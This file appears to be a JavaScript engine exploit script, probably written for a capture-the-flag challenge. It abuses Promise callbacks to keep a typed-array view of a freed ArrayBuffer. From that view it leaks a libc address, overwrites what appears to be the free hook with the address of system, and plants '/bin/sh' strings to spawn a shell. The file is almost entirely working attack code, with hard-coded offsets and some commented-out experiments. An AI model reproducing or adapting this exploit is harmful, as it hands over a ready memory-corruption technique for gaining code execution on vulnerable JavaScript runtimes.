const hex = (x) => ("0x" + x.toString(16));
let a0, a1;

function f2(b)
{
  console.log("Resolve3");
  // Math.min(a1);
  const abs = [];
  a1 = undefined;
  for (let i = 0; i < 8; i++)
  {
    abs.push(new ArrayBuffer(8));
  }
  const tas = [];
  for (let i = 0; i < 8; i++)
  {
    const ta = new Uint32Array(abs[i]);
    ta[0] = 1852400175;
    ta[1] = 6845231;
    tas.push(ta);
  }
  const libc_addr = a0[0x170/4] + a0[0x170/4+1] * 0x100000000 - 0x3ebca0
  console.log(hex(libc_addr));
  a0[0x1d8/4] = (libc_addr + 0x3ed8e8) % 0x100000000;
  a0[0x1d8/4 + 1] = ((libc_addr + 0x3ed8e8) - a0[0x1d8/4]) / 0x100000000;
  tas[0][0] = (libc_addr + 0x4f550) % 0x100000000;
  tas[0][1] = ((libc_addr + 0x4f550) - tas[0][0]) / 0x100000000;
  console.log("finish");

  Math.min(a0);
  // console.log(a0);
  // while(1);
  // a1.a = 1;
}

function f(a)
{
  // Math.min(a);
  console.log("Resolve2");
  arr = undefined;
  // Math.min(a);
  a0 = new Uint32Array(a); a1 = a0;

  let p = new Promise((resolve, reject) =>
  {
    console.log("Promise Init 2");
    resolve(0);
  });
  p.then(f2);
}

let arr = new ArrayBuffer(0x500);
// let arr2 = [0x1338, {}];
// let arr3 = [0x1339, {}];
function main()
{
  // Promise.allSettled([arr]);
  let p = new Promise((resolve, reject) =>
  {
    console.log("Promise Init");
    resolve(arr);
  });
  // Math.min(arr);
  p.then(f);
  // Math.min(arr);
  console.log("Finish Main");

}

main();

// .then((a)=>
// {
//   console.log("Resolve1");
//   Math.min(a);
//   a = undefined;
// })

// let arr = [0x1337, {}];
// let arr2 = arr;
// let arr3 = arr;
// arr3 = undefined;
// arr2 = undefined;
// Math.min(arr);